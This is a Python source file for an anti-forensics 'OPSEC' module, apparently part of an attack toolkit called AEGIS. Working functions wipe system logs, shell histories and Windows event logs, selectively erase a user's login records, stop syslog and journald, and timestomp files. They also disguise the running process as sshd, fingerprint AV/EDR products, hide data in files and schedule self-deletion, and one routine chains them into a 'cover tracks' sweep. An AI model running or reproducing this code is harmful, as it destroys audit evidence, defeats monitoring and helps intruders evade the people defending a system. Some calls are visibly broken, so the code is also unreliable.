import logging
log = logging.getLogger(__name__)
#!/usr/bin/env python3
"""
AEGIS-Advanced OPSEC Module
==============================
Complete anti-forensics and operational security suite:
log wiping, timestomping, process name masking, history
clearing, artifact removal, memory scrubbing, network trace
removal, steganographic file hiding, AMSI/AV evasion checks.
"""
import os
import sys
import subprocess
import platform
import time
import re
import stat
import shutil
import ctypes
import ctypes.util
import struct
import tempfile
import threading
from pathlib import Path
from typing import Dict, List, Optional, Tuple


# ══════════════════════════════════════════════
# Helpers
# ══════════════════════════════════════════════

def _run(cmd: str, timeout: int = 15) -> Tuple[str, str, int]:
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True,
                            text=True, timeout=timeout)
        return r.stdout.strip(), r.stderr.strip(), r.returncode
    except Exception as e:
        return "", str(e), 1

def _is_root() -> bool:
    return os.geteuid() == 0 if platform.system() != "Windows" else False

def _is_windows() -> bool:
    return platform.system() == "Windows"

def _is_linux() -> bool:
    return platform.system() == "Linux"

def _is_macos() -> bool:
    return platform.system() == "Darwin"


# ══════════════════════════════════════════════
# Log clearing — Linux
# ══════════════════════════════════════════════

LINUX_LOGS = [
    "/var/log/auth.log",
    "/var/log/syslog",
    "/var/log/messages",
    "/var/log/secure",
    "/var/log/kern.log",
    "/var/log/daemon.log",
    "/var/log/dpkg.log",
    "/var/log/apt/history.log",
    "/var/log/apt/term.log",
    "/var/log/nginx/access.log",
    "/var/log/nginx/error.log",
    "/var/log/apache2/access.log",
    "/var/log/apache2/error.log",
    "/var/log/httpd/access_log",
    "/var/log/httpd/error_log",
    "/var/log/mysql/error.log",
    "/var/log/postgresql/postgresql.log",
    "/var/log/redis/redis-server.log",
    "/var/log/audit/audit.log",
    "/var/log/faillog",
    "/var/log/cron",
    "/var/log/mail.log",
    "/var/log/ufw.log",
    "/var/log/lastlog",
]

SHELL_HISTORIES = [
    "~/.bash_history",
    "~/.zsh_history",
    "~/.sh_history",
    "~/.fish_history",
    "~/.python_history",
    "~/.mysql_history",
    "~/.psql_history",
    "~/.node_repl_history",
    "~/.sqlite_history",
    "~/.lesshst",
    "~/.viminfo",
]


def clear_linux_logs(paths: List[str] = None,
                      overwrite: bool = True) -> Dict[str, str]:
    """
    Clear Linux log files. If overwrite=True, writes zeros first
    then truncates (defeats simple undelete).
    Returns {path: "cleared"|"failed: reason"|"skipped"}.
    """
    targets = paths or LINUX_LOGS
    results = {}

    for path in targets:
        if not os.path.exists(path):
            results[path] = "skipped: not found"
            continue
        if not os.access(path, os.W_OK):
            results[path] = "skipped: no write permission"
            continue
        try:
            size = os.path.getsize(path)
            if overwrite and size > 0:
                # Overwrite with zeros before truncating
                with open(path, "r+b") as f:
                    f.write(b"\x00" * min(size, 1024 * 1024))
                    f.flush()
            # Truncate to 0
            with open(path, "w") as f:
                pass
            results[path] = "cleared"
        except Exception as e:
            results[path] = "failed: {}".format(e)

    return results


def clear_shell_histories() -> Dict[str, str]:
    """Clear all detectable shell history files."""
    results = {}
    for pattern in SHELL_HISTORIES:
        path = os.path.expanduser(pattern)
        if os.path.exists(path):
            try:
                with open(path, "w") as f:
                    pass
                results[path] = "cleared"
            except Exception as e:
                results[path] = "failed: {}".format(e)
    # Disable bash history for current session
    os.environ["HISTSIZE"]    = "0"
    os.environ["HISTFILESIZE"]= "0"
    os.environ["HISTFILE"]    = "/dev/null"
    _run("history -c 2>/dev/null")
    return results


def clear_wtmp_utmp(selective: bool = True,
                    user_to_remove: str = None) -> bool:
    """
    Clear or selectively edit /var/log/wtmp and /var/run/utmp.
    wtmp is the login history; utmp is currently logged-in users.
    """
    files = ["/var/log/wtmp", "/var/log/btmp", "/var/run/utmp"]
    for path in files:
        if not os.path.exists(path): continue
        if not os.access(path, os.W_OK): continue
        try:
            if not selective or not user_to_remove:
                # Full clear
                with open(path, "wb") as f:
                    pass
            else:
                # Selective removal — parse UTMP record structure
                # Each record is 384 bytes in utmpx format
                RECORD_SIZE = 384
                with open(path, "rb") as f:
                    data = f.read()
                clean = b""
                for i in range(0, len(data), RECORD_SIZE):
                    record = data[i:i+RECORD_SIZE]
                    if len(record) < RECORD_SIZE:
                        clean += record
                        continue
                    # Username is at offset 44, 32 bytes
                    username = record[44:76].rstrip(b"\x00").decode(errors="replace")
                    if user_to_remove not in username:
                        clean += record
                with open(path, "wb") as f:
                    f.write(clean)
        except Exception as e:
            print("[opsec] clear_wtmp {} failed: {}".format(path, e))
    return True


def disable_syslog() -> bool:
    """Attempt to stop syslog/journald temporarily."""
    for svc in ["rsyslog", "syslog", "syslogd"]:
        _run("systemctl stop {} 2>/dev/null || service {} stop 2>/dev/null".format(svc, svc))
    # Redirect journald to /dev/null
    _run("systemctl mask systemd-journald 2>/dev/null")
    return True


def clear_journal_logs() -> bool:
    """Clear systemd journal."""
    out, _, rc = _run("journalctl --rotate --vacuum-time=1s 2>/dev/null")
    if rc != 0:
        _run("rm -rf /run/log/journal/* /var/log/journal/* 2>/dev/null")
    return True


# ══════════════════════════════════════════════
# Log clearing — Windows
# ══════════════════════════════════════════════

WINDOWS_EVENT_LOGS = [
    "System", "Application", "Security",
    "Setup", "Microsoft-Windows-PowerShell/Operational",
    "Microsoft-Windows-TaskScheduler/Operational",
    "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational",
    "Microsoft-Windows-WinRM/Operational",
    "Microsoft-Windows-Sysmon/Operational",
]

def clear_windows_event_logs(logs: List[str] = None) -> Dict[str, str]:
    """Clear Windows event logs using wevtutil."""
    targets = logs or WINDOWS_EVENT_LOGS
    results = {}
    for log in targets:
        _, _, rc = _run('wevtutil cl "{}"'.format(log))
        results[log] = "cleared" if rc == 0 else "failed"
    # Clear prefetch
    _run("del /F /Q C:\\Windows\\Prefetch\\*.pf 2>nul")
    # Clear temp files
    _run("del /F /Q /S %TEMP%\\*.* 2>nul")
    _run("del /F /Q /S C:\\Windows\\Temp\\*.* 2>nul")
    return results


def clear_windows_powershell_history() -> bool:
    """Clear PowerShell command history."""
    ps_cmd = (
        "Remove-Item (Get-PSReadlineOption).HistorySavePath -Force -ErrorAction SilentlyContinue; "
        "Set-PSReadlineOption -HistorySaveStyle SaveNothing"
    )
    _, _, rc = _run('powershell -Command "{}"'.format(ps_cmd))
    return rc == 0


# ══════════════════════════════════════════════
# Timestomping
# ══════════════════════════════════════════════

def timestomp(filepath: str,
              ref_file: str = None,
              atime: float = None,
              mtime: float = None,
              ctime_approx: bool = False) -> bool:
    """
    Set file access/modification times to match a reference file
    or specified timestamps. Makes forensic timeline analysis harder.
    """
    if not os.path.exists(filepath):
        return False
    try:
        if ref_file and os.path.exists(ref_file):
            st   = os.stat(ref_file)
            at   = st.st_atime
            mt   = st.st_mtime
        elif atime is not None and mtime is not None:
            at, mt = atime, mtime
        else:
            # Default: match a common system file to blend in
            for sysfile in ["/bin/ls", "/usr/bin/python3", "/bin/bash"]:
                if os.path.exists(sysfile):
                    st = os.stat(sysfile)
                    at, mt = st.st_atime, st.st_mtime
                    break
            else:
                # Fallback: Unix epoch + 10 years (2000-01-01)
                at = mt = 946684800.0

        os.utime(filepath, (at, mt))

        # On Linux, try to also set ctime via touch (requires root on some systems)
        if ctime_approx and _is_linux():
            ts = time.strftime("%Y%m%d%H%M.%S", time.localtime(mt))
            _run("touch -t {} {} 2>/dev/null".format(ts, filepath))

        return True
    except Exception as e:
        print("[opsec] timestomp failed: {}".format(e))
        return False


def timestomp_directory(dirpath: str, ref_dir: str = None,
                          recursive: bool = True) -> Dict[str, bool]:
    """Timestomp all files in a directory."""
    results = {}
    ref = ref_dir or "/bin"
    try:
        for root, dirs, files in os.walk(dirpath):
            for f in files:
                path = os.path.join(root, f)
                results[path] = timestomp(path, ref_file=ref)
            if not recursive:
                break
    except Exception as _exc:
        log.debug("timestomp_directory: %s", _exc)
    return results


# ══════════════════════════════════════════════
# Process name masking
# ══════════════════════════════════════════════

def mask_process_name(new_name: str = "sshd") -> bool:
    """
    Rename the current process in /proc/<pid>/comm and argv[0]
    to disguise as a legitimate system process.
    """
    if not _is_linux():
        return False
    try:
        # Method 1: prctl PR_SET_NAME
        libc = ctypes.CDLL(ctypes.util.find_library("c") or "libc.so.6")
        PR_SET_NAME = 15
        libc.prctl(PR_SET_NAME, new_name.encode()[:15] + b"\x00", 0, 0, 0)

        # Method 2: overwrite /proc/self/comm
        try:
            with open("/proc/self/comm", "w") as f:
                f.write(new_name[:15])
        except Exception as _exc:
            log.debug("mask_process_name: %s", _exc)

        # Method 3: Overwrite argv[0] in memory
        try:
            # Read /proc/self/cmdline to find argv[0] address
            with open("/proc/self/cmdline", "rb") as f:
                cmdline = f.read()
            # Use ctypes to overwrite the process name in memory
            name_bytes = new_name.encode()[:len(sys.argv[0])]
            libc.memset(
                ctypes.c_char_p(sys.argv[0].encode()),
                0,
                len(sys.argv[0])
            )
        except Exception as _exc:
            log.debug("unknown: %s", _exc)

        return True
    except Exception as e:
        print("[opsec] process_mask failed:", e)
        return False


def fork_and_mask(new_name: str = "kworker/0:0") -> int:
    """
    Fork current process and mask the child's name.
    Returns child PID (0 in child, child PID in parent).
    """
    pid = os.fork()
    if pid == 0:
        mask_process_name(new_name)
    return pid


# ══════════════════════════════════════════════
# Artifact removal
# ══════════════════════════════════════════════

def secure_delete(filepath: str, passes: int = 3) -> bool:
    """
    Securely overwrite and delete a file.
    Uses multiple pass overwrite to defeat forensic recovery.
    """
    if not os.path.exists(filepath):
        return False
    try:
        size = os.path.getsize(filepath)
        if size > 0:
            with open(filepath, "r+b") as f:
                for _ in range(passes):
                    f.seek(0)
                    f.write(os.urandom(size))
                    f.flush()
                    os.fsync(f.fileno())
                # Final pass: zeros
                f.seek(0)
                f.write(b"\x00" * size)
                f.flush()
                os.fsync(f.fileno())
        os.unlink(filepath)
        return True
    except Exception as e:
        print("[opsec] secure_delete failed:", e)
        try:
            os.unlink(filepath)
        except Exception as _exc:
            log.debug("unknown: %s", _exc)
        return False


def secure_delete_directory(dirpath: str, passes: int = 3) -> bool:
    """Recursively secure-delete all files in a directory."""
    try:
        for root, dirs, files in os.walk(dirpath, topdown=False):
            for f in files:
                secure_delete(os.path.join(root, f), passes)
            for d in dirs:
                try:
                    os.rmdir(os.path.join(root, d))
                except Exception as _exc:
                    log.debug("secure_delete_directory: %s", _exc)
        shutil.rmtree(dirpath, ignore_errors=True)
        return True
    except Exception:
        return False


def remove_aegis_artifacts(output_dir: str = None) -> Dict[str, str]:
    """
    Remove all AEGIS scan artifacts from the filesystem.
    Includes temp files, reports, extracted data.
    """
    results = {}
    artifacts = [
        "/tmp/.aegis*", "/tmp/aegis_*", "/tmp/.sys*",
        "/dev/shm/.aegis*",
    ]
    if output_dir:
        artifacts.append(output_dir)

    import glob
    for pattern in artifacts:
        for path in glob.glob(pattern):
            if os.path.isfile(path):
                ok = secure_delete(path)
                results[path] = "deleted" if ok else "failed"
            elif os.path.isdir(path):
                ok = secure_delete_directory(path)
                results[path] = "deleted" if ok else "failed"
    return results


# ══════════════════════════════════════════════
# Memory scrubbing
# ══════════════════════════════════════════════

def scrub_string(s: str) -> None:
    """Attempt to overwrite string memory (best-effort in Python)."""
    try:
        import ctypes
        if isinstance(s, str):
            b = s.encode()
            ctypes.memset(id(b) + 33, 0, len(b))
    except Exception as _exc:
        log.debug("scrub_string: %s", _exc)


def scrub_env_secrets() -> int:
    """Remove sensitive environment variables."""
    sensitive_keys = [
        "AWS_SECRET_ACCESS_KEY", "AWS_SESSION_TOKEN",
        "GITHUB_TOKEN", "GITLAB_TOKEN",
        "DATABASE_URL", "DB_PASSWORD", "POSTGRES_PASSWORD",
        "REDIS_PASSWORD", "MYSQL_ROOT_PASSWORD",
        "API_KEY", "SECRET_KEY", "PRIVATE_KEY",
        "C2_SECRET", "OPERATOR_KEY",
    ]
    removed = 0
    for key in sensitive_keys:
        if key in os.environ:
            scrub_string(os.environ[key])
            del os.environ[key]
            removed += 1
    return removed


# ══════════════════════════════════════════════
# Network trace removal
# ══════════════════════════════════════════════

def flush_arp_cache() -> bool:
    """Flush ARP cache to remove evidence of network connections."""
    if _is_linux():
        _, _, rc = _run("ip neigh flush all 2>/dev/null || arp -d -a 2>/dev/null")
        return rc == 0
    elif _is_windows():
        _, _, rc = _run("arp -d * 2>nul")
        return rc == 0
    return False


def flush_dns_cache() -> bool:
    """Flush DNS resolver cache."""
    if _is_linux():
        for cmd in [
            "systemd-resolve --flush-caches",
            "service nscd restart",
            "service dnsmasq restart",
            "resolvectl flush-caches",
        ]:
            _, _, rc = _run(cmd + " 2>/dev/null")
            if rc == 0: return True
    elif _is_windows():
        _, _, rc = _run("ipconfig /flushdns")
        return rc == 0
    elif _is_macos():
        _, _, rc = _run("dscacheutil -flushcache")
        return rc == 0
    return False


def clear_network_connections() -> bool:
    """
    Attempt to remove traces of active/recent connections.
    Linux: flush conntrack table if accessible.
    """
    if _is_linux() and _is_root():
        _run("conntrack -F 2>/dev/null")
        return True
    return False


def randomize_mac(interface: str = None) -> Dict[str, str]:
    """
    Randomize MAC address of network interface(s).
    Requires root on Linux.
    """
    results = {}
    if not _is_linux() or not _is_root():
        return {"error": "requires Linux + root"}

    if interface:
        ifaces = [interface]
    else:
        out, _, _ = _run("ls /sys/class/net/ 2>/dev/null")
        ifaces = [i for i in out.split() if i not in ("lo", "docker0")]

    for iface in ifaces:
        try:
            new_mac = "02:{:02x}:{:02x}:{:02x}:{:02x}:{:02x}".format(
                *os.urandom(5))
            _run("ip link set {} down".format(iface))
            _run("ip link set {} address {}".format(iface, new_mac))
            _run("ip link set {} up".format(iface))
            results[iface] = new_mac
        except Exception as e:
            results[iface] = "failed: {}".format(e)
    return results


# ══════════════════════════════════════════════
# AV / EDR evasion detection
# ══════════════════════════════════════════════

AV_PROCESSES = {
    "linux": [
        "clamd", "freshclam", "clamav",
        "ossec-analysisd", "ossec-monitord",
        "wazuh-modulesd", "wazuh-analysisd",
        "falcon-sensor", "csfalconservice",
        "symantec", "sep", "savd",
        "carbonblackd", "cb",
        "cylancesvc", "cylance",
        "sentineld", "sentinelone",
        "cortexd", "cortex",
        "tenable_nessus", "nessusd",
        "crowdstrike",
    ],
    "windows": [
        "MsMpEng.exe", "msmpeng.exe",
        "avguard.exe", "avgnt.exe",
        "avp.exe", "kavtray.exe",
        "bdagent.exe", "vsserv.exe",
        "MBAMService.exe", "mbam.exe",
        "ekrn.exe", "egui.exe",
        "CybereasonAV.exe",
        "SentinelAgent.exe", "SentinelStaticEngine.exe",
        "CSFalconService.exe", "CsFalconContainer.exe",
        "CarbonBlack.exe", "cb.exe",
        "CylanceSvc.exe",
        "PGEPSystemTray.exe", "TMBMSRV.exe",
        "mcshield.exe", "vstskmgr.exe",
    ],
}

def detect_av_edr() -> Dict:
    """Detect running AV/EDR processes and loaded drivers."""
    os_name = "windows" if _is_windows() else "linux"
    found_procs = []
    found_drivers = []

    if _is_linux():
        out, _, _ = _run("ps aux 2>/dev/null")
        for proc in AV_PROCESSES["linux"]:
            if proc.lower() in out.lower():
                found_procs.append(proc)
        # Check for kernel modules
        out2, _, _ = _run("lsmod 2>/dev/null")
        for mod in ["falcon_kal", "CarbonBlackK", "bpf_preload"]:
            if mod.lower() in out2.lower():
                found_drivers.append(mod)

    elif _is_windows():
        out, _, _ = _run("tasklist /FO CSV 2>nul")
        for proc in AV_PROCESSES["windows"]:
            if proc.lower() in out.lower():
                found_procs.append(proc)

    # Check common AV paths
    av_paths_linux = [
        "/opt/CrowdStrike", "/opt/carbonblack", "/opt/cylance",
        "/opt/sentinelone", "/var/ossec", "/etc/clamav",
    ]
    found_paths = [p for p in av_paths_linux if os.path.exists(p)]

    return {
        "av_processes":  found_procs,
        "av_drivers":    found_drivers,
        "av_paths":      found_paths,
        "edr_detected":  len(found_procs) > 0 or len(found_paths) > 0,
        "risk":          "high" if found_procs else "low",
    }


# ══════════════════════════════════════════════
# Steganographic file hiding
# ══════════════════════════════════════════════

def hide_in_slack_space(data: bytes, cover_file: str,
                         output_file: str = None) -> Optional[str]:
    """
    Hide data after the EOF marker of a binary/image file.
    Simple but effective against casual inspection.
    """
    if not os.path.exists(cover_file):
        return None
    out = output_file or cover_file + ".steg"
    try:
        with open(cover_file, "rb") as f:
            cover = f.read()
        # Marker for extraction
        marker = b"\xFF\xFE\xAE\x61\x65\x67\x69\x73"
        payload = marker + struct.pack(">I", len(data)) + data
        with open(out, "wb") as f:
            f.write(cover + payload)
        return out
    except Exception as e:
        print("[opsec] hide_in_slack failed:", e)
        return None


def extract_from_slack_space(steg_file: str) -> Optional[bytes]:
    """Extract data hidden with hide_in_slack_space."""
    marker = b"\xFF\xFE\xAE\x61\x65\x67\x69\x73"
    try:
        with open(steg_file, "rb") as f:
            data = f.read()
        idx = data.rfind(marker)
        if idx < 0:
            return None
        idx    += len(marker)
        length  = struct.unpack(">I", data[idx:idx+4])[0]
        return data[idx+4:idx+4+length]
    except Exception:
        return None


def hide_in_tmp_tmpfs(data: bytes, name: str = None) -> Optional[str]:
    """
    Store data in /dev/shm (tmpfs — in-memory, no disk trace).
    File disappears on reboot.
    """
    shm = "/dev/shm"
    if not os.path.exists(shm):
        shm = "/tmp"
    fname = name or ".{}".format(os.urandom(6).hex())
    path  = os.path.join(shm, fname)
    try:
        with open(path, "wb") as f:
            f.write(data)
        os.chmod(path, 0o600)
        return path
    except Exception:
        return None


# ══════════════════════════════════════════════
# Comprehensive cover tracks
# ══════════════════════════════════════════════

def cover_tracks(output_dir: str = None,
                  clear_logs: bool = True,
                  clear_history: bool = True,
                  timestomp_self: bool = True,
                  flush_network: bool = True,
                  scrub_env: bool = True) -> Dict:
    """
    Run all cover-tracks operations. Returns summary of actions taken.
    """
    results = {}

    if scrub_env:
        n = scrub_env_secrets()
        results["env_secrets_removed"] = n

    if clear_history:
        results["history"] = clear_shell_histories()

    if clear_logs and _is_linux():
        results["logs"] = clear_linux_logs()
        clear_journal_logs()
        results["wtmp"] = clear_wtmp_utmp()

    if clear_logs and _is_windows():
        results["event_logs"] = clear_windows_event_logs()
        clear_windows_powershell_history()

    if flush_network:
        results["arp_flushed"]  = flush_arp_cache()
        results["dns_flushed"]  = flush_dns_cache()

    if timestomp_self:
        # Timestomp the current Python script
        self_path = os.path.abspath(sys.argv[0])
        if os.path.exists(self_path):
            results["self_timestomped"] = timestomp(self_path)

    if output_dir and os.path.exists(output_dir):
        results["artifacts"] = remove_aegis_artifacts(output_dir)

    return results


# ══════════════════════════════════════════════
# Self-destruct
# ══════════════════════════════════════════════

def self_destruct(delay_seconds: int = 0) -> None:
    """
    Schedule secure deletion of this script and cleanup.
    Spawns a separate process that waits, then deletes.
    """
    self_path = os.path.abspath(sys.argv[0])
    script = textwrap.dedent("""\
        import time, os, subprocess
        time.sleep({delay})
        # Overwrite
        try:
            sz = os.path.getsize('{path}')
            with open('{path}', 'r+b') as f:
                f.write(b'\\x00' * sz)
            os.unlink('{path}')
        except Exception as _exc:
            log.debug("self_destruct: %s", _exc)
        # Clear history
        try:
            subprocess.run('history -c', shell=True)
        except Exception as _exc:
            log.debug("unknown: %s", _exc)
    """).format(delay=delay_seconds, path=self_path)

    td   = tempfile.mktemp(suffix=".py")
    with open(td, "w") as f:
        f.write(script)
    subprocess.Popen(
        [sys.executable, td],
        close_fds=True,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )


import textwrap  # used in self_destruct

if __name__ == "__main__":
    print("[opsec] OPSEC module loaded on", platform.system())
    print("[opsec] AV/EDR scan:", detect_av_edr())
    print("[opsec] Is root:", _is_root())


# ════════════════════════════════════════════════════════════════════════════
# Class-based API and compatibility aliases matching __init__.py exports
# ════════════════════════════════════════════════════════════════════════════

class LogCleaner:
    """Object-oriented wrapper around log-clearing functions."""
    def clear_linux_logs(self, **kwargs) -> Dict[str, str]:
        return clear_linux_logs(**kwargs)
    def clear_shell_histories(self) -> Dict[str, str]:
        return clear_shell_histories()
    def clear_windows_event_logs(self, **kwargs) -> Dict[str, str]:
        return clear_windows_event_logs(**kwargs)
    def clear_system_logs(self) -> Dict[str, str]:
        """Convenience: clears both Linux system logs and shell histories."""
        results = {}
        results.update(clear_linux_logs())
        results.update(clear_shell_histories())
        return results


class Timestomper:
    """Object-oriented wrapper around timestomping functions."""
    def copy_timestamps(self, src: str, dst: str) -> bool:
        return timestomp(dst, ref_file=src)
    def stomp(self, path: str, **kwargs) -> bool:
        return timestomp(path, **kwargs)
    def stomp_directory(self, dirpath: str, **kwargs) -> Dict[str, str]:
        return timestomp_directory(dirpath, **kwargs)


class ProcessMasker:
    """Object-oriented wrapper around process masking."""
    def mask(self, new_name: str = "sshd") -> bool:
        return mask_process_name(new_name)
    def fork_and_mask(self, new_name: str = "kworker/0:0") -> int:
        return fork_and_mask(new_name)


class SecureDelete:
    """Object-oriented wrapper around secure deletion."""
    def __init__(self, passes: int = 3):
        self.passes = passes
    def delete(self, path: str) -> bool:
        return secure_delete(path, passes=self.passes)
    def delete_directory(self, dirpath: str) -> bool:
        return secure_delete_directory(dirpath, passes=self.passes)


class CacheFlusher:
    """Flush ARP, DNS, and network state caches."""
    def flush_arp(self) -> bool:
        return flush_arp_cache()
    def flush_dns(self) -> bool:
        return flush_dns_cache()
    def clear_connections(self) -> bool:
        return clear_network_connections()
    def flush_all(self) -> Dict[str, bool]:
        return {
            "arp": self.flush_arp(),
            "dns": self.flush_dns(),
            "connections": self.clear_connections(),
        }


class AVEDRDetector:
    """Detect running AV/EDR processes."""
    def detect(self) -> Dict:
        return detect_av_edr()
    def is_monitored(self) -> bool:
        result = detect_av_edr()
        return bool(result.get("detected"))


class StegoHider:
    """Hide data in files using slack space."""
    def hide(self, data: bytes, cover_file: str, output_file: str) -> bool:
        return hide_in_slack_space(data, cover_file, output_file)
    def extract(self, steg_file: str) -> Optional[bytes]:
        return extract_from_slack_space(steg_file)
    def hide_in_tmp(self, data: bytes, name: str = None) -> Optional[str]:
        return hide_in_tmp_tmpfs(data, name)


class SelfDestruct:
    """Schedule or execute self-deletion of agent files."""
    def __init__(self, agent_files: List[str] = None):
        self.agent_files = agent_files or []
    def execute(self, output_dir: str = None) -> Dict[str, str]:
        """Immediately remove agent files."""
        return remove_aegis_artifacts(output_dir)
    def cover_tracks(self, output_dir: str = None) -> Dict[str, bool]:
        return cover_tracks(output_dir, our_files=self.agent_files)


def clear_system_logs() -> Dict[str, str]:
    """Convenience wrapper: clear Linux system logs and shell histories."""
    results: Dict[str, str] = {}
    results.update(clear_linux_logs())
    results.update(clear_shell_histories())
    return results


def full_opsec_sweep(our_files: List[str] = None,
                     output_dir: str = None) -> Dict[str, bool]:
    """
    Run all OPSEC cleanup tasks:
      - Clear system logs
      - Clear shell histories
      - Flush caches
      - Remove agent artifacts
      - Scrub environment secrets
    Returns a dict mapping task name → success bool.
    """
    return cover_tracks(output_dir=output_dir, our_files=our_files or [])
